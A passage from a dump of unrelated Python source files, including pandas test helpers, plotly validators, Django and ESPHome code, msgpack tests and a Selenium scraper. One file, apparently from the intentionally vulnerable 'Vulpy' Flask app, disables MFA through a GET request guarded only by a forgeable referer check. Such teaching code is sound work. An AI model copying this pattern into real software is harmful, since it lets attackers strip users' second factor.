            os.remove(path)  # noqa: PDF008
        except OSError:
            pass


def safe_close(store):
    try:
        if store is not None:
            store.close()
    except OSError:
        pass


def create_tempfile(path):
    """"""create an unopened named temporary file""""""
    return os.path.join(tempfile.gettempdir(), path)


# contextmanager to ensure the file cleanup
@contextmanager
def ensure_clean_store(path, mode=""a"", complevel=None, complib=None, fletcher32=False):

    try:

        # put in the temporary path if we don't have one already
        if not len(os.path.dirname(path)):
            path = create_tempfile(path)

        store = HDFStore(
            path, mode=mode, complevel=complevel, complib=complib, fletcher32=False
        )
        yield store
    finally:
        safe_close(store)
        if mode == ""w"" or mode == ""a"":
            safe_remove(path)


@contextmanager
def ensure_clean_path(path):
    """"""
    return essentially a named temporary file that is not opened
    and deleted on exiting; if path is a list, then create and
    return list of filenames
    """"""
    try:
        if isinstance(path, list):
            filenames = [create_tempfile(p) for p in path]
            yield filenames
        else:
            filenames = [create_tempfile(path)]
            yield filenames[0]
    finally:
        for f in filenames:
            safe_remove(f)


def _maybe_remove(store, key):
    """"""
    For tests using tables, try removing the table to be sure there is
    no content from previous tests using the same table name.
    """"""
    try:
        store.remove(key)
    except (ValueError, KeyError):
        pass"
JY268	JY268-_hoverlabel.py	"import _plotly_utils.basevalidators


class HoverlabelValidator(_plotly_utils.basevalidators.CompoundValidator):
    def __init__(
        self, plotly_name=""hoverlabel"", parent_name=""scatterpolargl"", **kwargs
    ):
        super(HoverlabelValidator, self).__init__(
            plotly_name=plotly_name,
            parent_name=parent_name,
            data_class_str=kwargs.pop(""data_class_str"", ""Hoverlabel""),
            data_docs=kwargs.pop(
                ""data_docs"",
                """"""
            align
                Sets the horizontal alignment of the text
                content within hover label box. Has an effect
                only if the hover label text spans more two or
                more lines
            alignsrc
                Sets the source reference on Chart Studio Cloud
                for `align`.
            bgcolor
                Sets the background color of the hover labels
                for this trace
            bgcolorsrc
                Sets the source reference on Chart Studio Cloud
                for `bgcolor`.
            bordercolor
                Sets the border color of the hover labels for
                this trace.
            bordercolorsrc
                Sets the source reference on Chart Studio Cloud
                for `bordercolor`.
            font
                Sets the font used in hover labels.
            namelength
                Sets the default length (in number of
                characters) of the trace name in the hover
                labels for all traces. -1 shows the whole name
                regardless of length. 0-3 shows the first 0-3
                characters, and an integer >3 will show the
                whole name if it is less than that many
                characters, but if it is longer, will truncate
                to `namelength - 3` characters and add an
                ellipsis.
            namelengthsrc
                Sets the source reference on Chart Studio Cloud
                for `namelength`.
"""""",
            ),
            **kwargs,
        )"
JY503	JY503-display.py	"import esphome.codegen as cg
import esphome.config_validation as cv
from esphome import pins
from esphome.components import display
from esphome.const import (
    CONF_CLK_PIN,
    CONF_DIO_PIN,
    CONF_ID,
    CONF_LAMBDA,
    CONF_INTENSITY,
    CONF_INVERTED,
    CONF_LENGTH,
)

CODEOWNERS = [""@glmnet""]

tm1637_ns = cg.esphome_ns.namespace(""tm1637"")
TM1637Display = tm1637_ns.class_(""TM1637Display"", cg.PollingComponent)
TM1637DisplayRef = TM1637Display.operator(""ref"")

CONFIG_SCHEMA = display.BASIC_DISPLAY_SCHEMA.extend(
    {
        cv.GenerateID(): cv.declare_id(TM1637Display),
        cv.Optional(CONF_INTENSITY, default=7): cv.All(
            cv.uint8_t, cv.Range(min=0, max=7)
        ),
        cv.Optional(CONF_INVERTED, default=False): cv.boolean,
        cv.Optional(CONF_LENGTH, default=6): cv.All(cv.uint8_t, cv.Range(min=1, max=6)),
        cv.Required(CONF_CLK_PIN): pins.gpio_output_pin_schema,
        cv.Required(CONF_DIO_PIN): pins.gpio_output_pin_schema,
    }
).extend(cv.polling_component_schema(""1s""))


async def to_code(config):
    var = cg.new_Pvariable(config[CONF_ID])
    await cg.register_component(var, config)
    await display.register_display(var, config)

    clk = await cg.gpio_pin_expression(config[CONF_CLK_PIN])
    cg.add(var.set_clk_pin(clk))
    dio = await cg.gpio_pin_expression(config[CONF_DIO_PIN])
    cg.add(var.set_dio_pin(dio))

    cg.add(var.set_intensity(config[CONF_INTENSITY]))
    cg.add(var.set_inverted(config[CONF_INVERTED]))
    cg.add(var.set_length(config[CONF_LENGTH]))

    if CONF_LAMBDA in config:
        lambda_ = await cg.process_lambda(
            config[CONF_LAMBDA], [(TM1637DisplayRef, ""it"")], return_type=cg.void
        )
        cg.add(var.set_writer(lambda_))"
JY484	JY484-widgets.py	"from __future__ import absolute_import

from django import VERSION as django_version
from django import forms
from django.conf import settings
from django.utils.encoding import force_text
from django.utils.safestring import mark_safe
from django.utils.html import format_html

from .utils import get_icon_choices

CHOICES = get_icon_choices()

class IconWidget(forms.Select):

    def __init__(self, attrs=None):
        super(IconWidget, self).__init__(attrs, choices=CHOICES)

    if django_version >= (1, 11):
        def create_option(self, name, value, label, selected, index, subindex=None, attrs=None):
            option = super(IconWidget, self).create_option(name, value, label, selected, index, subindex=subindex, attrs=attrs)
            option[""attrs""][""data-icon""] = value
            return option
    else:
        def render_option(self, selected_choices, option_value, option_label):
            if option_value is None:
                option_value = ''
            option_value = force_text(option_value)
            if option_value in selected_choices:
                selected_html = mark_safe(' selected=""selected""')
                if not self.allow_multiple_selected:
                    # Only allow for a single selection.
                    selected_choices.remove(option_value)
            else:
                selected_html = ''
            return format_html('<option data-icon=""{0}"" value=""{0}""{1}>{2}</option>',
                option_value,
                selected_html,
                force_text(option_label),
            )

    class Media:

        js = (
            'fontawesome/js/django_fontawesome.js',
            'fontawesome/select2/select2.min.js'
        )

        css = {
            'all': (
                getattr(settings, 'FONTAWESOME_CSS_URL', 'fontawesome/css/font-awesome.min.css'),
                'fontawesome/select2/select2.css',
                'fontawesome/select2/select2-bootstrap.css'
            )
        }"
JD159	JD159-views.py	"import asyncio
import json

from openpyxl import load_workbook
from rest_framework.response import Response
from rest_framework.views import APIView

from wildberries.models import Product
from wildberries.pydantic import CardPydantic
from wildberries.utils import make_request


class CardView(APIView):
    @staticmethod
    def get_card_info(value):
        page = asyncio.run(make_request(value))
        return CardView.get_objects(page, value)

    @staticmethod
    def get_cards_info(file):
        values = []
        wb = load_workbook(file)
        for sheet in wb.sheetnames:
            for row in wb[sheet].iter_rows(values_only=True):
                values.append(row[0])
        cards_info = [CardView.get_card_info(i) for i in values]
        return cards_info

    @staticmethod
    def get_objects(page, value):
        card = None
        try:
            products = json.dumps(page['data']['products'][0])
            card = CardPydantic.parse_raw(products)
            Product.objects.create(**card.dict())
        except IndexError:
            print(f'id {value} отсутствует на сайте wildberries.ru')
        if card:
            return card.dict()
        else:
            return {'error': f'id {value} отсутствует на сайте wildberries.ru'}

    def post(self, request, *args, **kwargs):
        data = None
        if 'file' in request.data and 'value' in request.data:
            return Response({'error': 'Одновременно отправлять поля '
                                      'file и value запрещено!'})
        elif 'file' in request.data:
            file = request.data['file']
            data = CardView.get_cards_info(file)
        elif 'value' in request.data:
            value = request.data['value']
            data = CardView.get_card_info(value)
        return Response(data)"
JD469	JD469-MicroAI.py	"import openai
import spacy
from translate import Translator
from app.ai.WolframeAlpha import WolframAlpha
from app.models.MongoDb import get_openai_key,get_wolframalpha_key

class MicroAI:
    def __init__(self, api_key):
        self.api_key = api_key
        self.nlp = spacy.load(""en_core_web_sm"")

    def get_engine(self, question):
        doc = self.nlp(question)
        if any(token.text.lower() in ['classify', 'categorize', 'group'] for token in doc):
            return ""text-davinci-002""
        elif any(token.text.lower() in ['summarize', 'brief', 'short'] for token in doc):
            return ""text-davinci-002""
        elif any(token.text.lower() in ['translate', 'conversion'] for token in doc):
            return ""text-davinci-002""
        elif any(token.text.lower() in ['solve', 'calculate', 'compute'] for token in doc):
            return ""text-davinci-003""
        elif any(token.text.lower() in ['create', 'build', 'design', 'generate'] for token in doc):
            return ""davinci-codex""
        else:
            return ""text-davinci-002""

    def generate_answer(self, question):
        wolfram = WolframAlpha(app_id=get_wolframalpha_key())
        answer = wolfram.answer_question(question=question)
        if ""Lỗi: "" in answer:
            translator = Translator(to_lang='en', from_lang='vi')
            question_en = translator.translate(question)
            engine = self.get_engine(question_en)

            openai.api_key = self.api_key
            completions = openai.Completion.create(
                engine=engine,
                prompt=question_en,
                max_tokens=1024,
                n=1,
                stop=None,
                temperature=0.5,
            )
            message = completions.choices[0].text

            result = {'engine': engine, 'question': question, 'answer': message}
            return result
        else:
            result = {'engine': 'WolframAlpha', 'question': question, 'answer': answer}
            return result"
JD476	JD476-test_format.py	"#!/usr/bin/env python
# coding: utf-8

from ...msgpack import unpackb

def check(src, should, use_list=0):
    assert unpackb(src, use_list=use_list) == should

def testSimpleValue():
    check(b""\x93\xc0\xc2\xc3"", 
            (None, False, True,))

def testFixnum():
    check(b""\x92\x93\x00\x40\x7f\x93\xe0\xf0\xff"",
          ((0,64,127,), (-32,-16,-1,),)
          )

def testFixArray():
    check(b""\x92\x90\x91\x91\xc0"",
          ((),((None,),),),
          )

def testFixRaw():
    check(b""\x94\xa0\xa1a\xa2bc\xa3def"",
          (b"""", b""a"", b""bc"", b""def"",),
          )

def testFixMap():
    check(
          b""\x82\xc2\x81\xc0\xc0\xc3\x81\xc0\x80"",
          {False: {None: None}, True:{None:{}}},
          )

def testUnsignedInt():
    check(
          b""\x99\xcc\x00\xcc\x80\xcc\xff\xcd\x00\x00\xcd\x80\x00""
          b""\xcd\xff\xff\xce\x00\x00\x00\x00\xce\x80\x00\x00\x00""
          b""\xce\xff\xff\xff\xff"",
          (0, 128, 255, 0, 32768, 65535, 0, 2147483648, 4294967295,),
          )

def testSignedInt():
    check(b""\x99\xd0\x00\xd0\x80\xd0\xff\xd1\x00\x00\xd1\x80\x00""
          b""\xd1\xff\xff\xd2\x00\x00\x00\x00\xd2\x80\x00\x00\x00""
          b""\xd2\xff\xff\xff\xff"",
          (0, -128, -1, 0, -32768, -1, 0, -2147483648, -1,))

def testRaw():
    check(b""\x96\xda\x00\x00\xda\x00\x01a\xda\x00\x02ab\xdb\x00\x00""
        b""\x00\x00\xdb\x00\x00\x00\x01a\xdb\x00\x00\x00\x02ab"",
        (b"""", b""a"", b""ab"", b"""", b""a"", b""ab""))

def testArray():
    check(b""\x96\xdc\x00\x00\xdc\x00\x01\xc0\xdc\x00\x02\xc2\xc3\xdd\x00""
        b""\x00\x00\x00\xdd\x00\x00\x00\x01\xc0\xdd\x00\x00\x00\x02""
        b""\xc2\xc3"",
        ((), (None,), (False,True), (), (None,), (False,True))
        )

def testMap():
    check(
        b""\x96""
            b""\xde\x00\x00""
            b""\xde\x00\x01\xc0\xc2""
            b""\xde\x00\x02\xc0\xc2\xc3\xc2""
            b""\xdf\x00\x00\x00\x00""
            b""\xdf\x00\x00\x00\x01\xc0\xc2""
            b""\xdf\x00\x00\x00\x02\xc0\xc2\xc3\xc2"",
        ({}, {None: False}, {True: False, None: False}, {},
            {None: False}, {True: False, None: False}))"
JD116	JD116-autocomplete.py	"from django.http import Http404, JsonResponse
from django.views.generic.list import BaseListView


class AutocompleteJsonView(BaseListView):
    """"""Handle AutocompleteWidget's AJAX requests for data.""""""
    paginate_by = 20
    model_admin = None

    def get(self, request, *args, **kwargs):
        """"""
        Return a JsonResponse with search results of the form:
        {
            results: [{id: ""123"" text: ""foo""}],
            pagination: {more: true}
        }
        """"""
        if not self.model_admin.get_search_fields(request):
            raise Http404(
                '%s must have search_fields for the autocomplete_view.' %
                type(self.model_admin).__name__
            )
        if not self.has_perm(request):
            return JsonResponse({'error': '403 Forbidden'}, status=403)

        self.term = request.GET.get('term', '')
        self.object_list = self.get_queryset()
        context = self.get_context_data()
        return JsonResponse({
            'results': [
                {'id': str(obj.pk), 'text': str(obj)}
                for obj in context['object_list']
            ],
            'pagination': {'more': context['page_obj'].has_next()},
        })

    def get_paginator(self, *args, **kwargs):
        """"""Use the ModelAdmin's paginator.""""""
        return self.model_admin.get_paginator(self.request, *args, **kwargs)

    def get_queryset(self):
        """"""Return queryset based on ModelAdmin.get_search_results().""""""
        qs = self.model_admin.get_queryset(self.request)
        qs, search_use_distinct = self.model_admin.get_search_results(self.request, qs, self.term)
        if search_use_distinct:
            qs = qs.distinct()
        return qs

    def has_perm(self, request, obj=None):
        """"""Check if user has permission to access the related model.""""""
        return self.model_admin.has_view_permission(request, obj=obj)"
JY308	JY308-_font.py	"import _plotly_utils.basevalidators


class FontValidator(_plotly_utils.basevalidators.CompoundValidator):
    def __init__(
        self, plotly_name=""font"", parent_name=""pointcloud.hoverlabel"", **kwargs
    ):
        super(FontValidator, self).__init__(
            plotly_name=plotly_name,
            parent_name=parent_name,
            data_class_str=kwargs.pop(""data_class_str"", ""Font""),
            data_docs=kwargs.pop(
                ""data_docs"",
                """"""
            color

            colorsrc
                Sets the source reference on Chart Studio Cloud
                for `color`.
            family
                HTML font family - the typeface that will be
                applied by the web browser. The web browser
                will only be able to apply a font if it is
                available on the system which it operates.
                Provide multiple font families, separated by
                commas, to indicate the preference in which to
                apply fonts if they aren't available on the
                system. The Chart Studio Cloud (at
                https://chart-studio.plotly.com or on-premise)
                generates images on a server, where only a
                select number of fonts are installed and
                supported. These include ""Arial"", ""Balto"",
                ""Courier New"", ""Droid Sans"",, ""Droid Serif"",
                ""Droid Sans Mono"", ""Gravitas One"", ""Old
                Standard TT"", ""Open Sans"", ""Overpass"", ""PT Sans
                Narrow"", ""Raleway"", ""Times New Roman"".
            familysrc
                Sets the source reference on Chart Studio Cloud
                for `family`.
            size

            sizesrc
                Sets the source reference on Chart Studio Cloud
                for `size`.
"""""",
            ),
            **kwargs,
        )"
JY139	JY139-0001_initial.py	"import django.contrib.admin.models
from django.conf import settings
from django.db import migrations, models


class Migration(migrations.Migration):

    dependencies = [
        migrations.swappable_dependency(settings.AUTH_USER_MODEL),
        ('contenttypes', '__first__'),
    ]

    operations = [
        migrations.CreateModel(
            name='LogEntry',
            fields=[
                ('id', models.AutoField(verbose_name='ID', serialize=False, auto_created=True, primary_key=True)),
                ('action_time', models.DateTimeField(auto_now=True, verbose_name='action time')),
                ('object_id', models.TextField(null=True, verbose_name='object id', blank=True)),
                ('object_repr', models.CharField(max_length=200, verbose_name='object repr')),
                ('action_flag', models.PositiveSmallIntegerField(verbose_name='action flag')),
                ('change_message', models.TextField(verbose_name='change message', blank=True)),
                ('content_type', models.ForeignKey(
                    to_field='id',
                    on_delete=models.SET_NULL,
                    blank=True, null=True,
                    to='contenttypes.ContentType',
                    verbose_name='content type',
                )),
                ('user', models.ForeignKey(
                    to=settings.AUTH_USER_MODEL,
                    on_delete=models.CASCADE,
                    verbose_name='user',
                )),
            ],
            options={
                'ordering': ['-action_time'],
                'db_table': 'django_admin_log',
                'verbose_name': 'log entry',
                'verbose_name_plural': 'log entries',
            },
            bases=(models.Model,),
            managers=[
                ('objects', django.contrib.admin.models.LogEntryManager()),
            ],
        ),
    ]"
JY309	JY309-_font.py	"import _plotly_utils.basevalidators


class FontValidator(_plotly_utils.basevalidators.CompoundValidator):
    def __init__(self, plotly_name=""font"", parent_name=""sankey.hoverlabel"", **kwargs):
        super(FontValidator, self).__init__(
            plotly_name=plotly_name,
            parent_name=parent_name,
            data_class_str=kwargs.pop(""data_class_str"", ""Font""),
            data_docs=kwargs.pop(
                ""data_docs"",
                """"""
            color

            colorsrc
                Sets the source reference on Chart Studio Cloud
                for `color`.
            family
                HTML font family - the typeface that will be
                applied by the web browser. The web browser
                will only be able to apply a font if it is
                available on the system which it operates.
                Provide multiple font families, separated by
                commas, to indicate the preference in which to
                apply fonts if they aren't available on the
                system. The Chart Studio Cloud (at
                https://chart-studio.plotly.com or on-premise)
                generates images on a server, where only a
                select number of fonts are installed and
                supported. These include ""Arial"", ""Balto"",
                ""Courier New"", ""Droid Sans"",, ""Droid Serif"",
                ""Droid Sans Mono"", ""Gravitas One"", ""Old
                Standard TT"", ""Open Sans"", ""Overpass"", ""PT Sans
                Narrow"", ""Raleway"", ""Times New Roman"".
            familysrc
                Sets the source reference on Chart Studio Cloud
                for `family`.
            size

            sizesrc
                Sets the source reference on Chart Studio Cloud
                for `size`.
"""""",
            ),
            **kwargs,
        )"
JD246	JD246-test_return_integer.py	"import pytest

from numpy import array
from . import util


class TestReturnInteger(util.F2PyTest):
    def check_function(self, t, tname):
        assert t(123) == 123
        assert t(123.6) == 123
        assert t(""123"") == 123
        assert t(-123) == -123
        assert t([123]) == 123
        assert t((123, )) == 123
        assert t(array(123)) == 123
        assert t(array([123])) == 123
        assert t(array([[123]])) == 123
        assert t(array([123], ""b"")) == 123
        assert t(array([123], ""h"")) == 123
        assert t(array([123], ""i"")) == 123
        assert t(array([123], ""l"")) == 123
        assert t(array([123], ""B"")) == 123
        assert t(array([123], ""f"")) == 123
        assert t(array([123], ""d"")) == 123

        # pytest.raises(ValueError, t, array([123],'S3'))
        pytest.raises(ValueError, t, ""abc"")

        pytest.raises(IndexError, t, [])
        pytest.raises(IndexError, t, ())

        pytest.raises(Exception, t, t)
        pytest.raises(Exception, t, {})

        if tname in [""t8"", ""s8""]:
            pytest.raises(OverflowError, t, 100000000000000000000000)
            pytest.raises(OverflowError, t, 10000000011111111111111.23)


class TestFReturnInteger(TestReturnInteger):
    sources = [
        util.getpath(""tests"", ""src"", ""return_integer"", ""foo77.f""),
        util.getpath(""tests"", ""src"", ""return_integer"", ""foo90.f90""),
    ]

    @pytest.mark.parametrize(""name"",
                             ""t0,t1,t2,t4,t8,s0,s1,s2,s4,s8"".split("",""))
    def test_all_f77(self, name):
        self.check_function(getattr(self.module, name), name)

    @pytest.mark.parametrize(""name"",
                             ""t0,t1,t2,t4,t8,s0,s1,s2,s4,s8"".split("",""))
    def test_all_f90(self, name):
        self.check_function(getattr(self.module.f90_return_integer, name),
                            name)"
JD52	JD52-log.py	"""""""A simple log mechanism styled after PEP 282.""""""

# The class here is styled after PEP 282 so that it could later be
# replaced with a standard Python logging implementation.

DEBUG = 1
INFO = 2
WARN = 3
ERROR = 4
FATAL = 5

import sys

class Log:

    def __init__(self, threshold=WARN):
        self.threshold = threshold

    def _log(self, level, msg, args):
        if level not in (DEBUG, INFO, WARN, ERROR, FATAL):
            raise ValueError('%s wrong log level' % str(level))

        if level >= self.threshold:
            if args:
                msg = msg % args
            if level in (WARN, ERROR, FATAL):
                stream = sys.stderr
            else:
                stream = sys.stdout
            try:
                stream.write('%s\n' % msg)
            except UnicodeEncodeError:
                # emulate backslashreplace error handler
                encoding = stream.encoding
                msg = msg.encode(encoding, ""backslashreplace"").decode(encoding)
                stream.write('%s\n' % msg)
            stream.flush()

    def log(self, level, msg, *args):
        self._log(level, msg, args)

    def debug(self, msg, *args):
        self._log(DEBUG, msg, args)

    def info(self, msg, *args):
        self._log(INFO, msg, args)

    def warn(self, msg, *args):
        self._log(WARN, msg, args)

    def error(self, msg, *args):
        self._log(ERROR, msg, args)

    def fatal(self, msg, *args):
        self._log(FATAL, msg, args)

_global_log = Log()
log = _global_log.log
debug = _global_log.debug
info = _global_log.info
warn = _global_log.warn
error = _global_log.error
fatal = _global_log.fatal

def set_threshold(level):
    # return the old threshold for use from tests
    old = _global_log.threshold
    _global_log.threshold = level
    return old

def set_verbosity(v):
    if v <= 0:
        set_threshold(WARN)
    elif v == 1:
        set_threshold(INFO)
    elif v >= 2:
        set_threshold(DEBUG)"
JD461	JD461-cf.py	"""""""
Calculations
""""""

from __init__ import ureg, Q_
from math import log, pi
import numpy as np


def calc_q_temp_oh(constants=None, props=None):
    mdot_c = constants[""mdot_c""]
    temp_oc = constants[""temp_oc""]
    temp_ic = constants[""temp_ic""]
    cp_c = props[""cp_c""]

    q = mdot_c * cp_c * (temp_oc - temp_ic)

    mdot_h = constants[""mdot_h""]
    T_ih = constants[""T_ih""]
    cp_h = props[""cp_h""]

    T_oh = (q / (mdot_h * cp_h) - T_ih) * -1
    return q, T_oh


def calc_cr_cmin_cmax(constants=None, props=None):
    mdot_h = constants[""mdot_h""]
    mdot_c = constants[""mdot_c""]
    cp_h = props[""cp_h""]
    cp_c = props[""cp_c""]

    c_h = mdot_h * cp_h
    c_c = mdot_c * cp_c

    if c_h < c_c:
        c_r = c_h / c_c
        c_min = c_h
        c_max = c_c
    else:
        c_r = c_c / c_h
        c_min = c_c
        c_max = c_h
    return c_r, c_min, c_max


def calc_eta(constants=None, c_min=None, q=None):
    temp_ih = constants[""temp_ih""]
    temp_ic = constants[""temp_ic""]

    q_max = c_min * (temp_ih - temp_ic)
    eta = q / q_max
    return eta


def calc_ntu(eta=None, c_r=None, c_min=None):
    F = (eta * c_r - 1)/(eta - 1)
    eta_1 = (F - 1)/(F - c_r)
    E = (2/eta_1 - (1 + c_r)) * (1 + c_r**2)**(-1/2)
    ntu = -1 * (1 + c_r**2)**(-1/2) * log((E-1)/(E+1))
    UA = ntu * c_min
    return UA


""""""
Parametric calculations
""""""


# TODO: Do parametric calc in main.py
def calc_hc(constants=None, props=None, tube_diameter_outer=None, tube_thickness=None):
    mdot_c = constants[""mdot_c""]
    mu_c = props[""mu_c""]
    pr_c = props[""pr_c""]
    k_c = props[""k_c""]

    inner_diam = tube_diameter_outer - 2 * tube_thickness
    re_d = (4 * mdot_c)/(pi * inner_diam * mu_c)

    if re_d > 3500:
        # Flow is turbulent
        nu_d = 0.023 * re_d**(4/5) * pr_c**0.4
    else:
        # Flow is laminar
        nu_d = 4.36     # Uniform heat flux

    h_c = (nu_d * k_c)/inner_diam
    return h_c


def calc_hh():
    return None


# TODO: Remember to include number of tubes in area calculations
def calc_length_parametric():
    return None"
JY191	JY191-_subprocesses.py	"from abc import abstractmethod
from signal import Signals
from typing import Optional

from ._resources import AsyncResource
from ._streams import ByteReceiveStream, ByteSendStream


class Process(AsyncResource):
    """"""An asynchronous version of :class:`subprocess.Popen`.""""""

    @abstractmethod
    async def wait(self) -> int:
        """"""
        Wait until the process exits.

        :return: the exit code of the process
        """"""

    @abstractmethod
    def terminate(self) -> None:
        """"""
        Terminates the process, gracefully if possible.

        On Windows, this calls ``TerminateProcess()``.
        On POSIX systems, this sends ``SIGTERM`` to the process.

        .. seealso:: :meth:`subprocess.Popen.terminate`
        """"""

    @abstractmethod
    def kill(self) -> None:
        """"""
        Kills the process.

        On Windows, this calls ``TerminateProcess()``.
        On POSIX systems, this sends ``SIGKILL`` to the process.

        .. seealso:: :meth:`subprocess.Popen.kill`
        """"""

    @abstractmethod
    def send_signal(self, signal: Signals) -> None:
        """"""
        Send a signal to the subprocess.

        .. seealso:: :meth:`subprocess.Popen.send_signal`

        :param signal: the signal number (e.g. :data:`signal.SIGHUP`)
        """"""

    @property
    @abstractmethod
    def pid(self) -> int:
        """"""The process ID of the process.""""""

    @property
    @abstractmethod
    def returncode(self) -> Optional[int]:
        """"""
        The return code of the process. If the process has not yet terminated, this will be
        ``None``.
        """"""

    @property
    @abstractmethod
    def stdin(self) -> Optional[ByteSendStream]:
        """"""The stream for the standard input of the process.""""""

    @property
    @abstractmethod
    def stdout(self) -> Optional[ByteReceiveStream]:
        """"""The stream for the standard output of the process.""""""

    @property
    @abstractmethod
    def stderr(self) -> Optional[ByteReceiveStream]:
        """"""The stream for the standard error output of the process."""""""
JY214	JY214-_frozenbidict.py	"# Copyright 2009-2022 Joshua Bronson. All rights reserved.
#
# This Source Code Form is subject to the terms of the Mozilla Public
# License, v. 2.0. If a copy of the MPL was not distributed with this
# file, You can obtain one at http://mozilla.org/MPL/2.0/.


#                             * Code review nav *
#                        (see comments in __init__.py)
#==============================================================================
# ← Prev: _base.py          Current: _frozenbidict.py       Next: _bidict.py →
#==============================================================================

""""""Provide :class:`frozenbidict`, an immutable, hashable bidirectional mapping type.""""""

import typing as t

from ._base import BidictBase
from ._typing import KT, VT


class frozenbidict(BidictBase[KT, VT]):
    """"""Immutable, hashable bidict type.""""""

    _hash: int

    # Work around lack of support for higher-kinded types in Python.
    # Ref: https://github.com/python/typing/issues/548#issuecomment-621571821
    if t.TYPE_CHECKING:
        @property
        def inverse(self) -> 'frozenbidict[VT, KT]': ...

    def __hash__(self) -> int:
        """"""The hash of this bidict as determined by its items.""""""
        if getattr(self, '_hash', None) is None:
            # The following is like hash(frozenset(self.items()))
            # but more memory efficient. See also: https://bugs.python.org/issue46684
            self._hash = t.ItemsView(self)._hash()  # type: ignore [attr-defined]  # https://github.com/python/typeshed/pull/7153
        return self._hash


#                             * Code review nav *
#==============================================================================
# ← Prev: _base.py          Current: _frozenbidict.py       Next: _bidict.py →
#=============================================================================="
JY112	JY112-intranges.py	"""""""
Given a list of integers, made up of (hopefully) a small number of long runs
of consecutive integers, compute a representation of the form
((start1, end1), (start2, end2) ...). Then answer the question ""was x present
in the original list?"" in time O(log(# runs)).
""""""

import bisect
from typing import List, Tuple


def intranges_from_list(list_: List[int]) -> Tuple[int, ...]:
    """"""Represent a list of integers as a sequence of ranges:
    ((start_0, end_0), (start_1, end_1), ...), such that the original
    integers are exactly those x such that start_i <= x < end_i for some i.

    Ranges are encoded as single integers (start << 32 | end), not as tuples.
    """"""

    sorted_list = sorted(list_)
    ranges = []
    last_write = -1
    for i in range(len(sorted_list)):
        if i + 1 < len(sorted_list):
            if sorted_list[i] == sorted_list[i + 1] - 1:
                continue
        current_range = sorted_list[last_write + 1 : i + 1]
        ranges.append(_encode_range(current_range[0], current_range[-1] + 1))
        last_write = i

    return tuple(ranges)


def _encode_range(start: int, end: int) -> int:
    return (start << 32) | end


def _decode_range(r: int) -> Tuple[int, int]:
    return (r >> 32), (r & ((1 << 32) - 1))


def intranges_contain(int_: int, ranges: Tuple[int, ...]) -> bool:
    """"""Determine if `int_` falls into one of the ranges in `ranges`.""""""
    tuple_ = _encode_range(int_, 0)
    pos = bisect.bisect_left(ranges, tuple_)
    # we could be immediately ahead of a tuple (start, end)
    # with start < int_ <= end
    if pos > 0:
        left, right = _decode_range(ranges[pos - 1])
        if left <= int_ < right:
            return True
    # or we could be immediately behind a tuple (int_, end)
    if pos < len(ranges):
        left, _ = _decode_range(ranges[pos])
        if left == int_:
            return True
    return False"
JY525	JY525-mod_mfa.py	"import sqlite3
from flask import Blueprint, render_template, redirect, request, g, session, make_response, flash
import libuser
import libsession
import libmfa
import pyotp
import qrcode
import base64
from io import BytesIO


mod_mfa = Blueprint('mod_mfa', __name__, template_folder='templates')


@mod_mfa.route('/', methods=['GET'])
def do_mfa_view():

    if 'username' not in g.session:
        return redirect('/user/login')

    if libmfa.mfa_is_enabled(g.session['username']):
        return render_template('mfa.disable.html')
    else:
        libmfa.mfa_reset_secret(g.session['username'])
        secret = libmfa.mfa_get_secret(g.session['username'])
        secret_url = pyotp.totp.TOTP(secret).provisioning_uri(g.session['username'], issuer_name=""Vulpy"")
        img = qrcode.make(secret_url)

        buffered = BytesIO()
        img.save(buffered, format=""PNG"")
        img_str = base64.b64encode(buffered.getvalue()).decode()

        return render_template('mfa.enable.html', secret_url=secret_url, img_str=img_str)


@mod_mfa.route('/', methods=['POST'])
def do_mfa_enable():

    if 'username' not in g.session:
        return redirect('/user/login')

    secret = libmfa.mfa_get_secret(g.session['username'])

    otp = request.form.get('otp')

    totp = pyotp.TOTP(secret)

    if totp.verify(otp):
        libmfa.mfa_enable(g.session['username'])
        return redirect('/mfa/')
    else:
        flash(""The OTP was incorrect"")
        return redirect('/mfa/')

    return render_template('mfa.enable.html')


@mod_mfa.route('/disable', methods=['GET'])
def do_mfa_disable():

    if 'username' not in g.session:
        return redirect('/user/login')

    if 'referer' not in request.headers or request.headers['referer'] != 'vulpy.com':
        return redirect('/user/login')

    libmfa.mfa_disable(g.session['username'])
    return redirect('/mfa/')
"
JY85	JY85-const.py	"""""""
PostGIS to GDAL conversion constant definitions
""""""
# Lookup to convert pixel type values from GDAL to PostGIS
GDAL_TO_POSTGIS = [None, 4, 6, 5, 8, 7, 10, 11, None, None, None, None]

# Lookup to convert pixel type values from PostGIS to GDAL
POSTGIS_TO_GDAL = [1, 1, 1, 3, 1, 3, 2, 5, 4, None, 6, 7, None, None]

# Struct pack structure for raster header, the raster header has the
# following structure:
#
# Endianness, PostGIS raster version, number of bands, scale, origin,
# skew, srid, width, and height.
#
# Scale, origin, and skew have x and y values. PostGIS currently uses
# a fixed endianness (1) and there is only one version (0).
POSTGIS_HEADER_STRUCTURE = 'B H H d d d d d d i H H'

# Lookup values to convert GDAL pixel types to struct characters. This is
# used to pack and unpack the pixel values of PostGIS raster bands.
GDAL_TO_STRUCT = [
    None, 'B', 'H', 'h', 'L', 'l', 'f', 'd',
    None, None, None, None,
]

# Size of the packed value in bytes for different numerical types.
# This is needed to cut chunks of band data out of PostGIS raster strings
# when decomposing them into GDALRasters.
# See https://docs.python.org/library/struct.html#format-characters
STRUCT_SIZE = {
    'b': 1,  # Signed char
    'B': 1,  # Unsigned char
    '?': 1,  # _Bool
    'h': 2,  # Short
    'H': 2,  # Unsigned short
    'i': 4,  # Integer
    'I': 4,  # Unsigned Integer
    'l': 4,  # Long
    'L': 4,  # Unsigned Long
    'f': 4,  # Float
    'd': 8,  # Double
}

# Pixel type specifies type of pixel values in a band. Storage flag specifies
# whether the band data is stored as part of the datum or is to be found on the
# server's filesystem. There are currently 11 supported pixel value types, so 4
# bits are enough to account for all. Reserve the upper 4 bits for generic
# flags.
# See https://trac.osgeo.org/postgis/wiki/WKTRaster/RFC/RFC1_V0SerialFormat#Pixeltypeandstorageflag
BANDTYPE_PIXTYPE_MASK = 0x0F
BANDTYPE_FLAG_HASNODATA = 1 << 6"
JD32	JD32-main.py	"import csv
import time

from selenium import webdriver
from selenium.webdriver.common.by import By

driver_path = r'D:\software\chromedriver.exe'
driver = webdriver.Chrome(executable_path=driver_path)


def get_post_data(url):
    driver.get(url)
    driver.maximize_window()
    driver.implicitly_wait(10)

    jobs = []

    lis = driver.find_elements(By.CLASS_NAME, ""job-card-wrapper"")
    for item in lis:
        job_name = item.find_element(By.CLASS_NAME, 'job-name').text
